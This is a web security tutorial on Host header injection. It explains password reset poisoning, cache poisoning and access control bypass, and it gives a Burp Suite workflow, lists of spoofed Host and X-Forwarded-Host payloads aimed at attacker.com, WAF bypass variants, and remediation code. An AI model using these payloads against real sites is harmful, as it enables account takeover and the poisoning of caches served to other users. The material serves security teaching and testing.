Host Header Injection

Host Header Injection occurs when an attacker manipulates the HTTP Host header to trick the server into performing unintended actions · such as sending a password reset email with a link pointing to the attacker's server, poisoning the web cache, or bypassing access controls based on hostname validation.

HIGH BSCP Intermediate

Real-World Analogy

📖 The Hotel Switchboard

You call a hotel and tell the switchboard operator your name. The operator doesn't verify who you are · they simply note your name and use it for all subsequent interactions. "You claim to be VIP Guest, so I'll transfer you to the executive floor." Meanwhile, you're actually calling from outside the hotel. If you lie about your name ("I'm VIP Guest"), the operator treats you like a VIP. Similarly, the web server trusts the Host header without validating it, allowing you to impersonate a trusted hostname.

Send the same request with a modified Host header (your domain or malicious value) and observe if the response or email changes. Check if the feature uses the Host header in password reset emails, cache keys, or access control checks. This is often overlooked but can be critical.

How It Works

The Host header is part of HTTP request metadata and tells the server which hostname the request is destined for. Servers use this for several purposes:

  1. Virtual hosting: Multiple domains on one server; Host tells the server which domain's content to serve.
  2. URL generation: When the server needs to create an absolute URL (for email links, redirects), it constructs it using the Host header.
  3. Access control: Some servers check if Host is an internal domain to grant special privileges.
  4. Cache keying: Caching layers (CDNs, proxies) may include Host in the cache key · or forget to.

The vulnerability: If the server blindly trusts the Host header without validation, an attacker can inject an arbitrary hostname. If that hostname is then used to generate URLs (especially in password reset emails), the attacker controls where the victim is directed.

Example attack flow:

1. Attacker sends: POST /forgot-password HTTP/1.1
               Host: attacker.com
               email=victim@gmail.com

2. Server trusts the Host header and generates a reset link:
   https://attacker.com/reset?token=abc123xyz

3. Email sent to victim contains the attacker's domain link

4. Victim clicks the link, thinking it's legitimate

5. Attacker's server logs the token and uses it to reset the victim's password

Where to Look

Host header injection is most dangerous in these features:

  • Password reset: Verify emails with Host-based links are the #1 attack vector.
  • Email verification: Similar to password reset · links sent via email often use the Host header.
  • Account recovery: Any flow that emails the user a link.
  • Webhooks & callbacks: Features that register a webhook URL may construct it from the Host header.
  • Redirects: Open redirects combined with Host header injection can bypass filters.
  • Virtual hosting with load balancers: Multi-tenant applications using Host-based routing are often vulnerable.
  • Cache poisoning vectors: If caching layer doesn't properly include Host in the cache key.

Red flag: Any application that allows multiple domains or subdomains and routes based on Host is a candidate for Host header testing.

Burp Suite Workflow

1
Find password reset or email verification flow. Navigate to the password reset page (usually /forgot-password). In Burp Proxy, submit the form and intercept the POST request. 
POST /api/forgot-password HTTP/1.1
Host: target.com
...
email=victim@example.com
2
Modify the Host header to your attacker domain. Send the request to Repeater and change the Host header. 
POST /api/forgot-password HTTP/1.1
Host: attacker.com
...
email=victim@example.com
Send the request and check the response.
3
Test alternative Host header formats. Try these variations: 
Host: target.com.attacker.com  (subdomain confusion)
Host: target.com:8080  (port confusion)
Host: target.com@attacker.com  (@ confusion)
X-Forwarded-Host: attacker.com  (proxy header override)
X-Host: attacker.com
X-Forwarded-Server: attacker.com
4
Use a Burp Collaborator payload. To confirm Host header injection in email flows without needing to access the victim's email, use a Burp Collaborator domain: 
Host: YOUR.burpcollaborator.net
POST /api/forgot-password
email=your-test-email@example.com
Check the Collaborator tab for DNS/HTTP interactions.
5
Test duplicate Host headers. Some servers process the first Host header, some the second. Send two: 
Host: target.com
Host: attacker.com
POST /api/forgot-password
email=victim@example.com
6
Check cache headers for poisoning. If the response includes caching headers (Cache-Control, Expires), the response might be cached. Remove your Cache-Control headers and resend to potentially poison the cache for other users. 
GET /api/user-profile HTTP/1.1
Host: attacker.com
Cache-Control: no-cache  (remove this)

Payloads & Techniques

Basic Host Header Injection

Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com

Subdomain Confusion

Exploit URL parsing confusion by injecting a valid domain as a subdomain:

Host: target.com.attacker.com
Host: attacker.com.target.com

Port Confusion

Try different port numbers to trigger different parsing behavior:

Host: target.com:8080
Host: target.com:@attacker.com
Host: target.com:attacker.com

Credential Injection via Host Header

Some parsers allow userinfo in the Host header:

Host: user:pass@attacker.com
Host: attacker.com@target.com

Null Byte Injection

Older frameworks may truncate at null bytes:

Host: target.com%00attacker.com
Host: target.com%0aHost: attacker.com

WAF Bypass Techniques

Duplicate Host Headers

Send two Host headers: Host: legitimate.com\r\nHost: attacker.com. Some WAFs check only the first; some backends use the last.

Host: legitimate.com
Host: attacker.com

Header Value Whitespace

Host: legitimate.com attacker.com (space-delimited). Some parsers treat everything after a space as a port or ignore it; others parse the full string differently from the WAF.

Host: legitimate.com attacker.com

X-Forwarded-Host and Override Headers

If direct Host injection is blocked, try proxy override headers. WAFs often don't inspect all override headers:

X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com

Absolute URI in Request Line

Use an absolute URI in the request line: GET http://attacker.com/path HTTP/1.1 with Host: legitimate.com. Some proxies use the URI host; some WAFs only check the Host header.

GET http://attacker.com/path HTTP/1.1
Host: legitimate.com

Port Injection

Host: legitimate.com:8080@attacker.com · some URL parsers treat the @ as a credentials separator and use attacker.com as the host.

Host: legitimate.com:8080@attacker.com

Case Variation

HOST: attacker.com or hOsT: attacker.com · HTTP headers are case-insensitive; some WAFs only match exact case.

HOST: attacker.com
hOsT: attacker.com

Exploitation & Impact

Password Reset Poisoning

Impact: Critical. Inject attacker.com in the Host header during password reset. The reset email will contain a link to attacker.com. The victim clicks the link, and the attacker's server captures the reset token. The attacker can then reset the victim's password.

Victim receives email: https://attacker.com/reset?token=xyz123
Attacker intercepts token and uses it to reset victim's password

Cache Poisoning via Host Header

Impact: High. If responses are cached, injecting a malicious Host header can poison the cache. All subsequent users (including legitimate ones) receive the poisoned response.

  • Inject XSS payload via Host header → cached response served to all users.
  • Inject redirect to phishing site → all users redirected.
  • Inject malicious JavaScript → stored XSS affecting all users.

SSRF via Host Header

Impact: High. In some routing architectures, the Host header controls which backend server processes the request. By changing the Host header to localhost or an internal IP, you might bypass firewall rules and access internal services.

Access Control Bypass

Impact: Medium-High. If the application checks if the Host is an internal domain to grant privileges, spoofing the Host header bypasses this check.

Original: Host: admin.internal.com  → Access granted
Attack: Host: admin.internal.com (from external IP)  → Access granted!

Web Cache Deception

Impact: Medium. Similar to cache poisoning, but with opposite intent: force caching of private pages that shouldn't be cached, then access them without authentication.

Remediation

1. Validate Host Header Against Whitelist

Only allow a hardcoded list of approved hostnames:

const ALLOWED_HOSTS = [
  'example.com',
  'www.example.com',
  'api.example.com'
];

if (!ALLOWED_HOSTS.includes(req.headers.host)) {
  return res.status(400).send('Invalid Host');
}

2. Use a Configured Base URL, Not Host Header

For generating absolute URLs (especially in emails), use a configuration variable instead of the Host header:

// Bad: uses Host header
const resetLink = `https://${req.headers.host}/reset?token=${token}`;

// Good: uses configured base URL
const BASE_URL = process.env.APP_BASE_URL || 'https://example.com';
const resetLink = `${BASE_URL}/reset?token=${token}`;

3. Strip Untrusted Forwarded Headers at Load Balancer

If you have a reverse proxy or load balancer in front of your application, configure it to strip suspicious headers like X-Forwarded-Host before passing the request to the backend:

# Nginx example
location / {
  proxy_pass http://backend;
  proxy_set_header Host $host;
  proxy_set_header X-Forwarded-Host "";  # Strip untrusted header
}

4. Use Absolute URLs in Email Templates

Don't rely on request-based values in email links; hardcode the domain:

// Bad
emailBody = `Click here: https://${req.headers.host}/reset?token=${token}`;

// Good
emailBody = `Click here: https://app.example.com/reset?token=${token}`;

5. Validate Host Header for Cache Keys

If implementing custom caching, ensure Host is part of the cache key and that only whitelisted hosts are cached:

const cacheKey = `${req.method}:${req.headers.host}:${req.url}`;
// Ensure host is validated before caching

6. Monitor Host Header Anomalies

Log and alert when Host headers don't match expected values:

  • Host header differs from SNI (TLS Server Name Indication).
  • Host header doesn't match any whitelisted domain.
  • X-Forwarded-Host differs from Host.

Common Beginner Mistakes

Only Testing Basic Host Header Override

Mistake: Testers try Host: attacker.com once and move on. Fix: Test multiple variations: subdomain confusion, port confusion, X-Forwarded-Host, duplicate headers. The vulnerability might only be triggered by a specific format.

Not Testing Password Reset Flows

Mistake: Skipping password reset entirely because it's "not sexy." Fix: Password reset poisoning is the most common and impactful Host header attack. Always test it first.

Forgetting to Check Cache Headers

Mistake: Testing Host header injection but not checking if the response is cached. Fix: Look for Cache-Control, Expires, Age, X-Cache, CF-Cache-Status headers. If caching is present, the vulnerability is much more severe.

Not Using Burp Collaborator for Email Flows

Mistake: Trying to manually check if the injected Host appears in emails. Fix: Use Burp Collaborator · it's automatic and reliable. Set Host to a Collaborator domain and check the Collaborator tab for interactions.

Missing Access Control Checks

Mistake: Only testing email/cache vectors and missing access control. Fix: Always test if admin or internal features check the Host header to grant privileges. Spoof the internal hostname to bypass access controls.
